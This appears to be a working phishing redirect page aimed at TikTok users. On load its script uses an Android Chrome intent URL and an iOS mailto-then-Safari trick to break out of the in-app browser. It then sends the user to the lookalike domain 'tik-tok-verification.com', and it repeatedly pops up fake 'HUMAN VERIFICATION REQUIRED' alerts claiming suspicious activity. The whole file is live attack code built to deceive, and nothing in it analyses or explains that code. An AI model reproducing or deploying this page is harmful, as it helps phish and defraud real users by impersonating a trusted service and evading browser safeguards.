<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = targetUrl.replace(/^https?:\/\//, '');
    const killTime = Date.now() + 5000;

    function theCleanBreak() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: We use the "Chrome-Package" Intent. 
            // This bypasses the app picker and forces the real Chrome app.
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE MAIL-RELAY PIVOT
            
            // 1. Trigger the system mailto. This forces the OS to "wake up" 
            // and prepare to leave the TikTok app.
            window.location.href = "mailto:verify@security.com?subject=Verification&body=Check";

            // 2. 250ms delay: While the OS is transitioning, we swap the target.
            // This forces the "Open in Safari?" prompt for the HTTPS link.
            setTimeout(() => {
                window.location.href = "safari-https://" + domain;
            }, 250);

            // 3. The "Ghost" Assignment as a hard-fail fallback
            setTimeout(() => {
                window.location.assign(targetUrl);
            }, 400);
        }
    }

    function runLoop() {
        if (Date.now() > killTime) return;

        theCleanBreak();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);
                
                theCleanBreak();
                setTimeout(runLoop, 400);
            }
        }, 400);
    }

    window.onload = runLoop;
</script>
</body>
</html>
